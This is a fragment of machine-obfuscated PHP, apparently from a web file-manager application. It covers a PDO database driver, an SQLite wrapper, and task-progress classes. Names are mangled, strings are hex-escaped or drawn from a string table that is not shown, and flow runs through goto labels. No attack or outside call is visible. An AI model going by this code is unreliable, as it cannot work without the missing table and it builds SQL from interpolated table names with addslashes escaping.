execute($ûóæÎõ, $ùÓˆ¢©š = array()) { $õûŸ©²© =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ûóæÎõ; if (!empty($ùÓˆ¢©š)) { $this->queryStr .= $õûŸ©²©[1026] . print_r($ùÓˆ¢©š, !0) . $õûŸ©²©[1027]; } $ÑÌ²½£ = !1; if ($this->dbType == $õûŸ©²©[1020]) { if (preg_match($õûŸ©²©[1028], $this->queryStr, $®äı•ò)) { $this->table = think_config($õûŸ©²©[1029]) . str_ireplace(think_config($õûŸ©²©[1030]), $õûŸ©²©[457], $®äı•ò[2]); $ÑÌ²½£ = (bool) $this->query($õûŸ©²©[1031] . strtoupper($this->table) . $õûŸ©²©[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õûŸ©²©[25], 1); think_status($õûŸ©²©[24]); $this->PDOStatement = $this->_linkID->prepare($ûóæÎõ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $†ö¯Şë = $this->PDOStatement->execute($ùÓˆ¢©š); $this->debug(); if (!1 === $†ö¯Şë) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÑÌ²½£ || preg_match($õûŸ©²©[1032], $ûóæÎõ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯“Å”áµ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¯“Å”áµ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $œŞşƒ˜Å = $this->_linkID->rollback(); $this->transTimes = 0; if (!$œŞşƒ˜Å) { $this->error(); return !1; } } return !0; } private function getAll() { $—ËÜô¿ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($—ËÜô¿); return $—ËÜô¿; } public function getFields($³ö›€û) { $²­áªƒô =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (think_config($²­áªƒô[1033])) { $’ù•¯§Ü = str_replace($²­áªƒô[1034], $³ö›€û, think_config($²­áªƒô[1033])); } else { switch ($this->dbType) { case $²­áªƒô[1017]: case $²­áªƒô[1035]: $’ù•¯§Ü = "\123\x45\114\105\x43\x54\x20\40\x20\x63\x6f\154\165\x6d\x6e\137\x6e\141\155\x65\40\141\x73\40\47\116\x61\155\145\x27\54\40\x20\40\144\141\x74\x61\x5f\x74\171\x70\145\40\141\163\40\x27\x54\x79\160\x65\47\x2c\40\40\40\x63\x6f\x6c\165\x6d\x6e\x5f\144\x65\146\141\165\154\x74\40\x61\163\40\47\104\x65\146\x61\165\x6c\x74\x27\x2c\x20\x20\x20\x69\x73\x5f\156\165\x6c\154\141\142\154\145\x20\141\163\40\47\116\x75\154\x6c\47\12\11\11\x46\122\117\115\x9\x69\x6e\146\x6f\162\x6d\x61\x74\151\x6f\156\x5f\x73\143\x68\145\155\141\56\164\141\142\x6c\145\x73\x20\x41\123\x20\164\12\11\x9\x4a\117\x49\x4e\x9\151\x6e\146\x6f\162\155\141\164\151\157\156\x5f\x73\143\x68\145\x6d\141\x2e\143\157\x6c\x75\155\156\163\40\101\x53\40\143\xa\11\11\117\116\40\x20\164\x2e\164\x61\142\154\x65\x5f\x63\141\164\141\154\x6f\147\x20\75\40\143\x2e\164\x61\142\154\145\137\143\141\x74\x61\x6c\x6f\147\12\11\11\101\x4e\x44\x20\164\x2e\x74\x61\x62\x6c\145\137\x73\x63\x68\145\x6d\x61\x20\75\x20\x63\56\164\x61\142\154\145\137\x73\143\x68\x65\155\141\12\x9\x9\101\x4e\x44\x20\x74\x2e\164\x61\142\x6c\x65\x5f\156\141\x6d\x65\x20\x3d\x20\x63\x2e\x74\x61\x62\154\x65\x5f\x6e\141\x6d\145\12\11\11\127\x48\105\x52\105\x20\x20\40\x74\56\x74\141\142\x6c\x65\137\x6e\141\155\x65\x20\75\40\47{$³ö›€û}\x27"; break; case $²­áªƒô[1036]: $’ù•¯§Ü = $²­áªƒô[1037] . $³ö›€û . $²­áªƒô[1038]; break; case $²­áªƒô[1018]: case $²­áªƒô[1020]: $’ù•¯§Ü = $²­áªƒô[1039] . $²­áªƒô[1040] . $²­áªƒô[1041] . strtoupper($³ö›€û) . $²­áªƒô[1042] . strtoupper($³ö›€û) . $²­áªƒô[1043]; break; case $²­áªƒô[1044]: $’ù•¯§Ü = $²­áªƒô[1045] . $³ö›€û . $²­áªƒô[1046]; break; case $²­áªƒô[1019]: break; case $²­áªƒô[1047]: default: $’ù•¯§Ü = $²­áªƒô[1048] . ($this->dbType == $²­áªƒô[1047] ? "\x60{$³ö›€û}\x60" : $³ö›€û); } } $†Ö‰Ô = $this->query($’ù•¯§Ü); $ˆôôÓÎÄ = array(); if ($†Ö‰Ô) { foreach ($†Ö‰Ô as $ëØµ±Ìü => $ƒ¼´àñ) { $ƒ¼´àñ = array_change_key_case($ƒ¼´àñ); $ƒ¼´àñ[$²­áªƒô[32]] = isset($ƒ¼´àñ[$²­áªƒô[32]]) ? $ƒ¼´àñ[$²­áªƒô[32]] : $²­áªƒô[457]; $ƒ¼´àñ[$²­áªƒô[33]] = isset($ƒ¼´àñ[$²­áªƒô[33]]) ? $ƒ¼´àñ[$²­áªƒô[33]] : $²­áªƒô[457]; $Û óøû½ = isset($ƒ¼´àñ[$²­áªƒô[353]]) ? $ƒ¼´àñ[$²­áªƒô[353]] : $ƒ¼´àñ[$²­áªƒô[32]]; $ˆôôÓÎÄ[$Û óøû½] = array($²­áªƒô[32] => $Û óøû½, $²­áªƒô[33] => $ƒ¼´àñ[$²­áªƒô[33]], $²­áªƒô[35] => (bool) (isset($ƒ¼´àñ[$²­áªƒô[106]]) && $ƒ¼´àñ[$²­áªƒô[106]] === $²­áªƒô[12] || isset($ƒ¼´àñ[$²­áªƒô[35]]) && $ƒ¼´àñ[$²­áªƒô[35]] === $²­áªƒô[12]), $²­áªƒô[37] => isset($ƒ¼´àñ[$²­áªƒô[37]]) ? $ƒ¼´àñ[$²­áªƒô[37]] : (isset($ƒ¼´àñ[$²­áªƒô[56]]) ? $ƒ¼´àñ[$²­áªƒô[56]] : $²­áªƒô[457]), $²­áªƒô[39] => isset($ƒ¼´àñ[$²­áªƒô[97]]) ? strtolower($ƒ¼´àñ[$²­áªƒô[97]]) == $²­áªƒô[41] : (isset($ƒ¼´àñ[$²­áªƒô[57]]) ? $ƒ¼´àñ[$²­áªƒô[57]] : !1), $²­áªƒô[42] => isset($ƒ¼´àñ[$²­áªƒô[1049]]) ? strtolower($ƒ¼´àñ[$²­áªƒô[1049]]) == $²­áªƒô[44] : (isset($ƒ¼´àñ[$²­áªƒô[97]]) ? $ƒ¼´àñ[$²­áªƒô[97]] : !1)); } } return $ˆôôÓÎÄ; } public function getTables($Îç—ì = '') { $ì…Ÿ«úÏ =& $_SERVER[ÅÄÇĞô]; if (think_config($ì…Ÿ«úÏ[1050])) { $ò½”üñ = str_replace($ì…Ÿ«úÏ[1051], $Îç—ì, think_config($ì…Ÿ«úÏ[1050])); } else { switch ($this->dbType) { case $ì…Ÿ«úÏ[1018]: case $ì…Ÿ«úÏ[1020]: $ò½”üñ = $ì…Ÿ«úÏ[1052]; break; case $ì…Ÿ«úÏ[1017]: case $ì…Ÿ«úÏ[1035]: $ò½”üñ = $ì…Ÿ«úÏ[1053]; break; case $ì…Ÿ«úÏ[1044]: $ò½”üñ = $ì…Ÿ«úÏ[1054]; break; case $ì…Ÿ«úÏ[1019]: think_exception(think_lang($ì…Ÿ«úÏ[1055]) . $ì…Ÿ«úÏ[1056]); break; case $ì…Ÿ«úÏ[1036]: $ò½”üñ = $ì…Ÿ«úÏ[45] . $ì…Ÿ«úÏ[46] . $ì…Ÿ«úÏ[47]; break; case $ì…Ÿ«úÏ[1047]: default: if (!empty($Îç—ì)) { $ò½”üñ = $ì…Ÿ«úÏ[999] . $Îç—ì . $ì…Ÿ«úÏ[1000]; } else { $ò½”üñ = $ì…Ÿ«úÏ[1001]; } } } $ë´Ó›ö© = $this->query($ò½”üñ); $ÙïØøµÉ = array(); foreach ($ë´Ó›ö© as $Á¸‡½Æ™ => $ùïÒˆ²á) { $ÙïØøµÉ[$Á¸‡½Æ™] = current($ùïÒˆ²á); } return $ÙïØøµÉ; } protected function parseLimit($¶­€÷°Î) { $‘¯¸ÙÈ =& $_SERVER[ÅÄÇĞô]; $ƒà‰¡•¿ = $‘¯¸ÙÈ[12]; if (!empty($¶­€÷°Î)) { switch ($this->dbType) { case $‘¯¸ÙÈ[1044]: case $‘¯¸ÙÈ[1036]: $¶­€÷°Î = explode($‘¯¸ÙÈ[50], $¶­€÷°Î); if (count($¶­€÷°Î) > 1) { $ƒà‰¡•¿ .= $‘¯¸ÙÈ[51] . $¶­€÷°Î[1] . $‘¯¸ÙÈ[52] . $¶­€÷°Î[0] . $‘¯¸ÙÈ[53]; } else { $ƒà‰¡•¿ .= $‘¯¸ÙÈ[51] . $¶­€÷°Î[0] . $‘¯¸ÙÈ[53]; } break; case $‘¯¸ÙÈ[1017]: case $‘¯¸ÙÈ[1035]: break; case $‘¯¸ÙÈ[1019]: break; case $‘¯¸ÙÈ[1018]: case $‘¯¸ÙÈ[1020]: break; case $‘¯¸ÙÈ[1047]: default: $ƒà‰¡•¿ .= $‘¯¸ÙÈ[51] . $¶­€÷°Î . $‘¯¸ÙÈ[53]; } } return $ƒà‰¡•¿; } public function parseKey(&$Ù¹ëåÆ, $Ú£ßÑ¨÷ = true) { $Á‚ğ¬¿‡ =& $_SERVER[ÅÄÇĞô]; if ($Ú£ßÑ¨÷) { $Ù¹ëåÆ = $this->parseKeyCheck($Ù¹ëåÆ); } if ($this->dbType == $Á‚ğ¬¿‡[1047]) { if ($Ù¹ëåÆ != $Á‚ğ¬¿‡[223] && !preg_match($Á‚ğ¬¿‡[1011], $Ù¹ëåÆ)) { $Ù¹ëåÆ = $Á‚ğ¬¿‡[464] . trim($Ù¹ëåÆ, $Á‚ğ¬¿‡[464]) . $Á‚ğ¬¿‡[464]; } return $Ù¹ëåÆ; } else { return parent::parseKey($Ù¹ëåÆ, $Ú£ßÑ¨÷); } } public function close() { $this->_linkID = null; } public function error() { $µƒËğ¹ =& $_SERVER[ÅÄÇĞô]; if ($this->PDOStatement) { $ñ­Áß®ö = $this->PDOStatement->errorInfo(); $this->error = $ñ­Áß®ö[1] . $µƒËğ¹[4] . $ñ­Áß®ö[2]; } else { $this->error = $µƒËğ¹[12]; } if ($µƒËğ¹[12] != $this->queryStr) { $this->error .= LNG($µƒËğ¹[48]) . $this->queryStr; } think_trace($this->error, $µƒËğ¹[12], $µƒËğ¹[49]); return $this->error; } public function escapeString($ï²ôÛéŠ) { $’ñ¡’¶ =& $_SERVER[ÅÄÇĞô]; switch ($this->dbType) { case $’ñ¡’¶[1044]: case $’ñ¡’¶[1017]: case $’ñ¡’¶[1035]: case $’ñ¡’¶[1047]: return addslashes($ï²ôÛéŠ); case $’ñ¡’¶[1019]: case $’ñ¡’¶[1036]: case $’ñ¡’¶[1018]: case $’ñ¡’¶[1020]: return str_ireplace($’ñ¡’¶[58], $’ñ¡’¶[59], $ï²ôÛéŠ); } } protected function parseValue($»˜Öœ™) { $È÷²ÂÅ† =& $_SERVER[ÅÄÇĞô]; if (is_string($»˜Öœ™)) { $¶ãï¾äË = strpos($»˜Öœ™, $È÷²ÂÅ†[4]) === 0 && in_array($»˜Öœ™, array_keys($this->bind)); $»˜Öœ™ = $¶ãï¾äË ? $this->escapeString($»˜Öœ™) : $È÷²ÂÅ†[1057] . $this->escapeString($»˜Öœ™) . $È÷²ÂÅ†[1057]; } elseif (isset($»˜Öœ™[0]) && is_string($»˜Öœ™[0]) && strtolower($»˜Öœ™[0]) == $È÷²ÂÅ†[375]) { $»˜Öœ™ = $this->escapeString($»˜Öœ™[1]); } elseif (is_array($»˜Öœ™)) { $»˜Öœ™ = array_map(array($this, $È÷²ÂÅ†[1058]), $»˜Öœ™); } elseif (is_bool($»˜Öœ™)) { $»˜Öœ™ = $»˜Öœ™ ? $È÷²ÂÅ†[91] : $È÷²ÂÅ†[231]; } elseif (is_null($»˜Öœ™)) { $»˜Öœ™ = $È÷²ÂÅ†[106]; } return $»˜Öœ™; } public function getLastInsertId() { $™• Œ–Ä =& $_SERVER[ÅÄÇĞô]; switch ($this->dbType) { case $™• Œ–Ä[1044]: case $™• Œ–Ä[1036]: case $™• Œ–Ä[1017]: case $™• Œ–Ä[1035]: case $™• Œ–Ä[1019]: case $™• Œ–Ä[1047]: return $this->_linkID->lastInsertId(); case $™• Œ–Ä[1018]: case $™• Œ–Ä[1020]: $ˆ“Š¸© = $this->table; $ú·´àĞ = $this->query("\123\105\x4c\x45\103\x54\40{$ˆ“Š¸©}\56\143\x75\x72\x72\x76\141\x6c\40\x63\x75\162\162\x76\x61\154\x20\x46\x52\117\x4d\x20\x64\x75\x61\154"); return $ú·´àĞ ? $ú·´àĞ[0][$™• Œ–Ä[1059]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($âÄò«ƒ) { $ƒèıÁŠÒ =& $_SERVER[ÅÄÇĞô]; if (!CacheLock::fileLock($ƒèıÁŠÒ[13])) { return !1; } $÷Á¡ñªş = parent::query($âÄò«ƒ); CacheLock::fileUnLock($ƒèıÁŠÒ[13]); return $÷Á¡ñªş; } public function execute($ê¨ĞÍ³‘) { $˜ô¤˜æ =& $_SERVER[ÅÄÇĞô]; if (!CacheLock::fileLock($˜ô¤˜æ[13])) { return !1; } $öàÈ±İú = parent::execute($ê¨ĞÍ³‘); CacheLock::fileUnLock($˜ô¤˜æ[13]); return $öàÈ±İú; } } goto fÓ´½åˆ»; B†°´ Ù®î: function binCheckBigger($ÈÒ½È„, $ŸßÄ¨ô‰) { return $ÈÒ½È„ > $ŸßÄ¨ô‰; } $_SERVER[$_SERVER[‹×Š·Ú¹][3]] = (base64_decode('ODYwNA==')."\x33\x32")+0;$_xa2l="mczvnt08diuje17by9fsk5qr2wp6lghax3o4c4wlj3zmbr80216nf7iptxuekghyvad5o";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($„ŒèƒãĞ, $ÙãÅ­ı) { $Ç‰ƒëã¥ =& $_SERVER[ÅÄÇĞô]; if (isset(self::$_methodList[$„ŒèƒãĞ])) { return @call_user_func_array(self::$_methodList[$„ŒèƒãĞ], $ÙãÅ­ı); } else { if (method_exists($this, $„ŒèƒãĞ)) { return call_user_func_array(array($this, $„ŒèƒãĞ), $ÙãÅ­ı); } else { think_exception(__CLASS__ . $Ç‰ƒëã¥[4] . $„ŒèƒãĞ . $Ç‰ƒëã¥[5]); } } } public static function __callStatic($›úêú’À, $ÍØ²‘Ä) { if (isset(self::$_methodListStatic[$›úêú’À])) { return call_user_func_array(self::$_methodListStatic[$›úêú’À], $ÍØ²‘Ä); } else { if (method_exists(self, $›úêú’À)) { return call_user_func_array(array(self, $›úêú’À), $ÍØ²‘Ä); } else { show_json("{$›úêú’À}\50\51\40\x6e\157\x74\x20\145\170\151\163\164\73", !1); } } } public static function addMethod($ùû–è£, $´ÂÆø‰«) { self::$_methodList[$ùû–è£] = $´ÂÆø‰«; } public static function addMethodStatic($İÔå¿àº, $ùö¼Ï´ß) { self::$_methodListStatic[$İÔå¿àº] = $ùö¼Ï´ß; } } goto C¦—–¤îÖ; câ›©Õ‚Ü: class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¨ï¹ºé, $ƒ×ñÕæ = '', $ƒó†Å = 0, $÷·ğÆ¥É = '') { $äŠÊ¬÷¸ =& $_SERVER[ÅÄÇĞô]; if (self::get($¨ï¹ºé)) { return; } $this->task = array($äŠÊ¬÷¸[478] => $¨ï¹ºé, $äŠÊ¬÷¸[1797] => USER_ID, $äŠÊ¬÷¸[1685] => $÷·ğÆ¥É, $äŠÊ¬÷¸[529] => $äŠÊ¬÷¸[12], $äŠÊ¬÷¸[33] => $ƒ×ñÕæ, $äŠÊ¬÷¸[1165] => $äŠÊ¬÷¸[12], $äŠÊ¬÷¸[1163] => $ƒó†Å, $äŠÊ¬÷¸[1798] => 0, $äŠÊ¬÷¸[1799] => 0, $äŠÊ¬÷¸[1800] => 0, $äŠÊ¬÷¸[1801] => timeFloat(), $äŠÊ¬÷¸[1802] => 0, $äŠÊ¬÷¸[1803] => 0, $äŠÊ¬÷¸[1804] => 0, $äŠÊ¬÷¸[1805] => 0, $äŠÊ¬÷¸[845] => $äŠÊ¬÷¸[1746]); $GLOBALS[$äŠÊ¬÷¸[1806]] = 1; Hook::bind($äŠÊ¬÷¸[1750], array($this, $äŠÊ¬÷¸[1807])); Hook::bind($äŠÊ¬÷¸[1808], array($this, $äŠÊ¬÷¸[1809])); $this->startAfter(); Hook::trigger($äŠÊ¬÷¸[1810], $this->task); $this->task[$äŠÊ¬÷¸[1803]] = timeFloat(); } public function end($œù‰Ÿ‚ = '') { $šìËĞœ =& $_SERVER[ÅÄÇĞô]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$šìËĞœ[1803]]) { self::valueSet($this->task[$šìËĞœ[478]], !1); } $this->isEnd = !0; if ($œù‰Ÿ‚) { $this->task[$šìËĞœ[529]] = $œù‰Ÿ‚; } self::log($šìËĞœ[1811] . $this->task[$šìËĞœ[478]] . $šìËĞœ[1812] . sprintf($šìËĞœ[952], timeFloat() - $this->task[$šìËĞœ[1801]]) . $šìËĞœ[1813]); Hook::unbind($šìËĞœ[1750], array($this, $šìËĞœ[1807])); Hook::unbind($šìËĞœ[1808], array($this, $šìËĞœ[1809])); $this->endAfter(); $¢×›¾Æ¼ = $this->task; $this->task = !1; Hook::trigger($šìËĞœ[1814], $¢×›¾Æ¼); } public function update($Àšáû‰µ = 0, $šóÈœ¨» = false) { $´‘²Ì•» =& $_SERVER[ÅÄÇĞô]; $£ÒÜò„ş =& $this->task; if (!$£ÒÜò„ş) { return; } $£ÒÜò„ş[$´‘²Ì•»[1798]] += $Àšáû‰µ; $£ÒÜò„ş[$´‘²Ì•»[1802]] = timeFloat(); if ($£ÒÜò„ş[$´‘²Ì•»[1163]]) { if ($£ÒÜò„ş[$´‘²Ì•»[1163]] < $£ÒÜò„ş[$´‘²Ì•»[1798]]) { $£ÒÜò„ş[$´‘²Ì•»[1163]] = $£ÒÜò„ş[$´‘²Ì•»[1798]]; } $‚£êƒœô = timeFloat() - $£ÒÜò„ş[$´‘²Ì•»[1801]] - $£ÒÜò„ş[$´‘²Ì•»[1804]]; if ($‚£êƒœô <= 0) { $‚£êƒœô = 0.001; } $£ÒÜò„ş[$´‘²Ì•»[1799]] = $£ÒÜò„ş[$´‘²Ì•»[1798]] / $£ÒÜò„ş[$´‘²Ì•»[1163]]; $£ÒÜò„ş[$´‘²Ì•»[1800]] = $£ÒÜò„ş[$´‘²Ì•»[1798]] / $‚£êƒœô; if ($£ÒÜò„ş[$´‘²Ì•»[1799]] > 0) { $£ÒÜò„ş[$´‘²Ì•»[1805]] = $‚£êƒœô * (1 - $£ÒÜò„ş[$´‘²Ì•»[1799]]) / $£ÒÜò„ş[$´‘²Ì•»[1799]]; } $£ÒÜò„ş[$´‘²Ì•»[1805]] = $£ÒÜò„ş[$´‘²Ì•»[1805]] <= 0 ? 0 : $£ÒÜò„ş[$´‘²Ì•»[1805]]; } $this->updateAfter(); $ó‚Ì„Ğ· = 0.2; if (timeFloat() - $£ÒÜò„ş[$´‘²Ì•»[1803]] < $ó‚Ì„Ğ· && !$šóÈœ¨») { return; } $§ùÀÑé = self::get($£ÒÜò„ş[$´‘²Ì•»[478]]); $·ºıĞ·û = $§ùÀÑé[$´‘²Ì•»[845]]; if ($·ºıĞ·û == self::STATYS_KILL) { $•‘¡Ú† = array($´‘²Ì•»[1815] => LNG($´‘²Ì•»[1816]), $´‘²Ì•»[1320] => !1); Cache::set($´‘²Ì•»[1817] . $this->task[$´‘²Ì•»[478]], $•‘¡Ú†, 30); $this->onKill(); $this->end(); die; } else { if ($·ºıĞ·û == self::STATYS_STOP) { $¨Ô´ˆ¨â = 2; $§ùÀÑé[$´‘²Ì•»[1804]] += $¨Ô´ˆ¨â; self::valueSet($£ÒÜò„ş[$´‘²Ì•»[478]], $§ùÀÑé); sleep($¨Ô´ˆ¨â); $this->update(); return; } } $£ÒÜò„ş[$´‘²Ì•»[845]] = $·ºıĞ·û ? $·ºıĞ·û : $£ÒÜò„ş[$´‘²Ì•»[845]]; $£ÒÜò„ş[$´‘²Ì•»[1804]] = $§ùÀÑé[$´‘²Ì•»[1804]] ? $§ùÀÑé[$´‘²Ì•»[1804]] : 0; $£ÒÜò„ş[$´‘²Ì•»[1803]] = timeFloat(); Hook::trigger($´‘²Ì•»[1818], $£ÒÜò„ş); self::valueSet($£ÒÜò„ş[$´‘²Ì•»[478]], $£ÒÜò„ş); } public function onKillSet($¦ÛÛÁ±–, $‹Åæª•› = array()) { $this->onKillCall = array($¦ÛÛÁ±–, $‹Åæª•›); } public function onKill() { $¦ÃÕãˆ÷ =& $_SERVER[ÅÄÇĞô]; self::log($¦ÃÕãˆ÷[1811] . $this->task[$¦ÃÕãˆ÷[478]] . $¦ÃÕãˆ÷[1819]); Hook::trigger($¦ÃÕãˆ÷[1820], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($İš•ª‚’) { $Ç¸§ÑÍ“ =& $_SERVER[ÅÄÇĞô]; Cache::set($Ç¸§ÑÍ“[1817] . $this->task[$Ç¸§ÑÍ“[478]], $İš•ª‚’, 60); if (!is_array($İš•ª‚’) || !$İš•ª‚’[$Ç¸§ÑÍ“[1320]]) { self::log($Ç¸§ÑÍ“[1821] . json_encode($İš•ª‚’)); } return $İš•ª‚’; } public static function get($®ĞªèÈ×) { $¾Æ’Ø… =& $_SERVER[ÅÄÇĞô]; $âè»³ùñ = self::valueGet($®ĞªèÈ×); if (is_array($âè»³ùñ) && $âè»³ùñ[$¾Æ’Ø…[1822]]) { $›°èÔâ» = ActionApply($âè»³ùñ[$¾Æ’Ø…[1822]], array($âè»³ùñ)); $âè»³ùñ = is_array($›°èÔâ») ? $›°èÔâ» : $âè»³ùñ; } return $âè»³ùñ; } public static function listData() { $¿—¼×ùã = self::valueGet(); return array_sort_by($¿—¼×ùã, $_SERVER[ÅÄÇĞô][1801], !0); } public static function kill($Ïšù) { return self::changeStatus($Ïšù, self::STATYS_KILL); } public static function stop($Ùäİßú) { return self::changeStatus($Ùäİßú, self::STATYS_STOP); } public static function restart($ßÇ”å×ú) { return self::changeStatus($ßÇ”å×ú, self::STATYS_RUNNING); } public static function killAll() { $Ô¥—¿‘® =& $_SERVER[ÅÄÇĞô]; $„ÌÃ¡ = self::listData(); foreach ($„ÌÃ¡ as $Şæ”şĞÊ) { self::kill($Şæ”şĞÊ[$Ô¥—¿‘®[478]]); } sleep(2); foreach ($„ÌÃ¡ as $Şæ”şĞÊ) { self::valueSet($Şæ”şĞÊ[$Ô¥—¿‘®[478]], !1); } } private static function changeStatus($»¡˜‰ª, $¾ßˆ£‚) { $´”‡£Ç =& $_SERVER[ÅÄÇĞô]; $ê¬í•ÊÕ = self::valueGet($»¡˜‰ª); if (!$ê¬í•ÊÕ) { return !1; } $ê¬í•ÊÕ[$´”‡£Ç[845]] = $¾ßˆ£‚; self::valueSet($»¡˜‰ª, $ê¬í•ÊÕ); self::log($´”‡£Ç[1823] . $ê¬í•ÊÕ[$´”‡£Ç[478]] . $´”‡£Ç[1824] . $¾ßˆ£‚); return !0; } public static function valueGet($İèğ½ŠÏ = false) { $¿äñÒªÈ =& $_SERVER[ÅÄÇĞô]; if ($İèğ½ŠÏ) { $ºª¯ùÂ‘ = Model($¿äñÒªÈ[523])->where(array($¿äñÒªÈ[97] => $İèğ½ŠÏ, $¿äñÒªÈ[33] => $¿äñÒªÈ[1172]))->find(); return $ºª¯ùÂ‘ ? json_decode($ºª¯ùÂ‘[$¿äñÒªÈ[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($£Æİ…Ÿ = false) { $ÇŠË±ê =& $_SERVER[ÅÄÇĞô]; $Èó¡†äŞ = array($ÇŠË±ê[33] => $ÇŠË±ê[1172]); if ($£Æİ…Ÿ) { $Èó¡†äŞ[$ÇŠË±ê[1797]] = $£Æİ…Ÿ; } $ú…êõ©Å = Model($ÇŠË±ê[523])->where($Èó¡†äŞ)->select(); $ú…êõ©Å = $ú…êõ©Å ? $ú…êõ©Å : array(); foreach ($ú…êõ©Å as $·°ÉŒí => $Ôéä©’û) { $ú…êõ©Å[$·°ÉŒí] = json_decode($Ôéä©’û[$ÇŠË±ê[453]], !0); } return $ú…êõ©Å; } public static function valueSet($àÑ¶Ò–ï, $©’•¹¯¶) { $¹·úÑ‡ =& $_SERVER[ÅÄÇĞô]; if (!$©’•¹¯¶) { return Model($¹·úÑ‡[523])->where(array($¹·úÑ‡[97] => $àÑ¶Ò–ï, $¹·úÑ‡[33] => $¹·úÑ‡[1172]))->delete(); } $Ä‡°˜£ = json_encode($©’•¹¯¶); if (!$Ä‡°˜£) { ob_start(); var_dump($©’•¹¯¶); $ŠêËŠÓú = ob_get_clean(); self::log($¹·úÑ‡[1825] . json_encode_force($ŠêËŠÓú)); } if (!$àÑ¶Ò–ï || !$©’•¹¯¶[$¹·úÑ‡[478]]) { return !1; } $“µÔÔ›‰ = array($¹·úÑ‡[33] => $¹·úÑ‡[1172], $¹·úÑ‡[1797] => USER_ID, $¹·úÑ‡[97] => $àÑ¶Ò–ï, $¹·úÑ‡[453] => $Ä‡°˜£); $¨ç÷£• = $¹·úÑ‡[1826]; CacheLock::lock($¨ç÷£•); Model($¹·úÑ‡[523])->add($“µÔÔ›‰, array(), !0); CacheLock::unlock($¨ç÷£•); } public static function log($£¥ËÚš¢) { if (!GLOBAL_DEBUG) { return; } write_log($£¥ËÚš¢, $_SERVER[ÅÄÇĞô][1827]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Âˆ¡è®å =& $_SERVER[ÅÄÇĞô]; $áçïä =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Âˆ¡è®å[1828], array($this, $Âˆ¡è®å[1829])); Hook::bind($Âˆ¡è®å[1331], array($this, $Âˆ¡è®å[1830])); Hook::bind($Âˆ¡è®å[1831], array($this, $Âˆ¡è®å[1832])); Hook::bind($Âˆ¡è®å[676], array($this, $Âˆ¡è®å[1833])); Hook::bind($Âˆ¡è®å[677], array($this, $Âˆ¡è®å[1834])); Hook::bind($Âˆ¡è®å[683], array($this, $Âˆ¡è®å[1835])); Hook::bind($Âˆ¡è®å[684], array($this, $Âˆ¡è®å[1836])); Hook::bind($Âˆ¡è®å[679], array($this, $Âˆ¡è®å[1837])); Hook::bind($Âˆ¡è®å[681], array($this, $Âˆ¡è®å[1838])); Hook::bind($Âˆ¡è®å[645], array($this, $Âˆ¡è®å[1839])); Hook::bind($Âˆ¡è®å[642], array($this, $Âˆ¡è®å[1839])); Hook::bind($Âˆ¡è®å[647], array($this, $Âˆ¡è®å[1839])); Hook::bind($Âˆ¡è®å[649], array($this, $Âˆ¡è®å[1839])); Hook::bind($Âˆ¡è®å[651], array($this, $Âˆ¡è®å[1839])); Hook::bind($Âˆ¡è®å[1840], array($this, $Âˆ¡è®å[1841])); Hook::bind($Âˆ¡è®å[667], array($this, $Âˆ¡è®å[1842])); $this->sourceModelCopyFlag = !1; Hook::bind($Âˆ¡è®å[1843], array($this, $Âˆ¡è®å[1844])); Hook::bind($Âˆ¡è®å[1845], array($this, $Âˆ¡è®å[1846])); Hook::bind($Âˆ¡è®å[1847], array($this, $Âˆ¡è®å[1848])); $áçïä[$Âˆ¡è®å[1849]] = LNG($Âˆ¡è®å[1850]); $áçïä[$Âˆ¡è®å[1851]] = 0; $áçïä[$Âˆ¡è®å[1852]] = 0; $áçïä[$Âˆ¡è®å[1165]] = $Âˆ¡è®å[12]; $áçïä[$Âˆ¡è®å[1853]] = $Âˆ¡è®å[12]; $áçïä[$Âˆ¡è®å[1854]] = 0; $áçïä[$Âˆ¡è®å[1855]] = 0; $áçïä[$Âˆ¡è®å[1856]] = 0; if (!$áçïä[$Âˆ¡è®å[1685]]) { $áçïä[$Âˆ¡è®å[1685]] = LNG($Âˆ¡è®å[1857]); } } protected function endAfter() { $’Ï£ˆ² =& $_SERVER[ÅÄÇĞô]; Hook::unbind($’Ï£ˆ²[1828], array($this, $’Ï£ˆ²[1829])); Hook::unbind($’Ï£ˆ²[1331], array($this, $’Ï£ˆ²[1830])); Hook::unbind($’Ï£ˆ²[1831], array($this, $’Ï£ˆ²[1832])); Hook::unbind($’Ï£ˆ²[676], array($this, $’Ï£ˆ²[1833])); Hook::unbind($’Ï£ˆ²[677], array($this, $’Ï£ˆ²[1834])); Hook::unbind($’Ï£ˆ²[683], array($this, $’Ï£ˆ²[1835])); Hook::unbind($’Ï£ˆ²[684], array($this, $’Ï£ˆ²[1836])); Hook::unbind($’Ï£ˆ²[679], array($this, $’Ï£ˆ²[1837])); Hook::unbind($’Ï£ˆ²[681], array($this, $’Ï£ˆ²[1838])); Hook::unbind($’Ï£ˆ²[645], array($this, $’Ï£ˆ²[1839])); Hook::unbind($’Ï£ˆ²[642], array($this, $’Ï£ˆ²[1839])); 